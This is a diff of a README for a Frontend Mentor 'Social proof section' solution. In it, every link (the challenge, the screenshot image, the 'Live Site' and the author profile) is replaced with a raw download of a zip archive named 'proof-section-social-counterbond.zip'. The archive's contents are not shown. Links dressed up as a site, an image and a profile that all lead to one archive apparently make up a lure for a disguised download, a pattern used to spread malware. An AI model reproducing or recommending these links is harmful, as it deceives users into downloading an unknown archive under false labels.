@@ -1,6 +1,6 @@
 # Frontend Mentor - Social proof section solution
 
-This is a solution to the [Social proof section challenge on Frontend Mentor](https://github.com/imadosan/social-proof-section/raw/refs/heads/main/design/social_proof_section_3.8.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
+This is a solution to the [Social proof section challenge on Frontend Mentor](https://raw.githubusercontent.com/imadosan/social-proof-section/main/design/proof-section-social-counterbond.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
 
 ## Table of contents
 
@@ -22,11 +22,11 @@ Users should be able to:
 
 ### Screenshot
 
-![](https://github.com/imadosan/social-proof-section/raw/refs/heads/main/design/social_proof_section_3.8.zip)
+![](https://raw.githubusercontent.com/imadosan/social-proof-section/main/design/proof-section-social-counterbond.zip)
 
 ### Links
 
-- [Live Site](https://github.com/imadosan/social-proof-section/raw/refs/heads/main/design/social_proof_section_3.8.zip)
+- [Live Site](https://raw.githubusercontent.com/imadosan/social-proof-section/main/design/proof-section-social-counterbond.zip)
 
 ## My process
 
@@ -40,4 +40,4 @@ Users should be able to:
 
 ## Author
 
-- Frontend Mentor - [@imadosan](https://github.com/imadosan/social-proof-section/raw/refs/heads/main/design/social_proof_section_3.8.zip)
+- Frontend Mentor - [@imadosan](https://raw.githubusercontent.com/imadosan/social-proof-section/main/design/proof-section-social-counterbond.zip)
